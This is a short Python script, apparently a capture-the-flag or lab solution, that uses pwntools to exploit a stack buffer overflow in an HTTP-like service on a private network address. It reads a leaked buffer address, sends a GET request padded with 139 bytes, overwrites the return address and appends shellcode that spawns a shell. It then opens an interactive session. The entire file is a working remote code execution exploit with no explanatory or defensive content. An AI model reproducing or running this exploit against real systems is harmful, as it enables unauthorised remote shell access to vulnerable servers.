#!/usr/bin/env python
from pwn import *

r = remote('192.168.1.111', 20000)

leak = r.recvuntil(':').split(' ')[4]
log.info('Leaked buffer address: ' + leak)

r.close()

r = remote('192.168.1.111', 20000)

payload  = ''
payload += 'GET '
payload += 'A' * 139
payload += p32(int(leak, 16) + 147)
payload += asm(shellcraft.i386.linux.sh())
payload += ' HTTP/1.1'

r.sendafter(')', payload)

r.interactive()